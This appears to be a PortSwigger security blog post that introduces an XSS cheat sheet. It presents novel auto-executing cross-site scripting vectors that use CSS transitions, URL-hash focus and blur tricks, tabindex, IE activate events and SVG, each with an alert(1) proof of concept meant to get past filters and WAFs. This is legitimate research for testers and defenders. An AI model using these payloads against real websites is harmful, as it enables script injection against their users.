PortSwigger are proud to launch our brand new [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

Our objective was to build the most comprehensive bank of information on bypassing HTML filters and WAFs to achieve [XSS](https://portswigger.net/web-security/cross-site-scripting), and to present this information in an accessible way. Each vector includes a hosted proof of concept and which browser it successfully executes on.

To ensure this cheat sheet was the best, I explored vectors using a combination of automated fuzzing and manual probing. This lead to quite a few novel XSS vectors, which are likely to be particularly effective at bypassing WAFs and filters - I'll take a look at some of the highlights here.

First up, you might be aware of [Mario Heiderich's](https://twitter.com/cure53berlin) technique using CSS animations to auto execute on any tag:

`<style>@keyframes x{}</style>
<b style="animation-name:x" onanimationstart="alert(1)"></b>`

I found you could do the same thing using the `ontransitionend` event but using the `:target` selector instead. The `:target` selector allows you to use the hash of the URL as a target for a CSS id. I use a CSS transition and because the `:target` selector changes the CSS after the transition is set, the event fires for any tag. You have to specify a hash of "x" in order for the `:target` selector to change the colour of the element.

`<style>
:target {
    color:red;
}
/*page.html#x*/
</style>
<x id=x style="transition:color 1s" ontransitionend=alert(1)>`

The `ontransitionend` event works in Chrome, and Firefox supports more events that can be executed automatically. The event `ontransitionrun` fires on any tag on Firefox and can be triggered like above and the `ontransitioncancel` will also fire automatically but requires modification of the URL.

You can use iframes or new windows to modify the hash of the URL. Browser [SOP](https://portswigger.net/web-security/cors/same-origin-policy) (same origin policy) prevents read access to cross domain URLs however it's possible to modify the location cross domain and so you can send the same URL with a hash to trigger the event.

`<style>
:target {
transform: rotate(180deg);
}
</style>
<x id=x style="transition transform 10s" ontransitioncancel=alert(1)>
URL: page.html#
URL: page.html#x
URL: page.html#`

With the hash in mind I began testing for similar XSS vectors. I discovered that certain elements would fire the `focus` event when using a hash in the URL with a corresponding id attribute. This means that form elements like input no longer needed an `autofocus` attribute to automatically focus.

`<input onfocus=alert(1) id=x>
someurl.php#x`

Other elements also work using the same trick:

`<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
<iframe id=x onfocus=alert(1)>
<embed id=x onfocus=alert(1) type=text/html>
<object id=x onfocus=alert(1) type=text/html>
someurl.php#x`

Because the `focus` event is firing without using an element that supports `autofocus`, we can use `autofocus` on another element to cause a blur event on every element that supports the focus trick.

`<iframe id=x onblur=alert(1)></iframe><input autofocus>
<input onblur=alert(1) id=x><input autofocus>
<textarea onblur=alert(1) id=x></textarea><input autofocus>
<button onblur=alert(1) id=x></button><input autofocus>
<select onblur=alert(1) id=x></select><input autofocus>
someurl.php#x`

Then I started to look at the tags that weren't firing the `focus` event using this trick. Would it be possible to make them execute? I was testing the anchor tag, if you give it a `href` attribute that would fire the `focus` event and if you gave it a `tabindex` attribute that would also fire the event without requiring the `href`. I then noticed that using the `tabindex` attribute would enable this trick to work on pretty much any element! Including custom elements:

`<a onfocus=alert(1) id=x href>
<xss onfocus=alert(1) id=x tabindex=1>
<xss onblur=alert(1) id=x tabindex=1><input autofocus>
someurl.php#x`

The trick above didn't work on link elements however adding a style with `display:block` forces the element to be shown and will fire the focus event. This works in the body but not in the head. If you have XSS in a link element you could always use the [accesskey trick](https://portswigger.net/blog/xss-in-hidden-input-fields) I published earlier:

`<link onfocus=alert(1) id=x tabindex=1 style=display:block>
someurl.php#x`

There are more `focus` based events. For example, `onfocusin` acts just like `onfocus`, and `onfocusout` behaves like `onblur`, and these events work on custom tags too.

`<a onfocusin=alert(1) id=x tabindex=1>
<xss onfocusin=alert(1) id=x tabindex=1>
<xss onfocusout="alert(1)" id="x" tabindex="1"><input autofocus>
someurl.php#x`

IE has some events when elements are activated;  `onactivate` can be used just like `onfocus` and works with custom tags, and `onbeforeactivate` fires before the element is activated.

`<a onactivate=alert(1) id=x tabindex=1>
<div onactivate=alert(1) id=x tabindex=1>
<xss onactivate=alert(1) id=x tabindex=1>
<a onbeforeactivate=alert(1) id=x tabindex=1>
someurl.php#x`

IE also has the `ondeactivate` and `onbeforedeactivate` events, in order to automatically execute these events you need to modify the hash twice as `autofocus` won't work in IE when the first element is focused.

`<a ondeactivate=alert(1) id=x tabindex=1></a><input id=y autofocus>
<xss ondeactivate=alert(1) id=x tabindex=1></xss><input id=y autofocus>
<a onbeforedeactivate=alert(1) id=x tabindex=1></a><input id=y autofocus>
someurl.php#x
someurl.php#y`

Finally here is a Chrome specific vector that works inside SVG:

`<svg><discard onbegin=alert(1)>`

There are many more vectors in the cheatsheet; I just chose the most interesting for the blog post. Browse on over to the [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to view the rest.
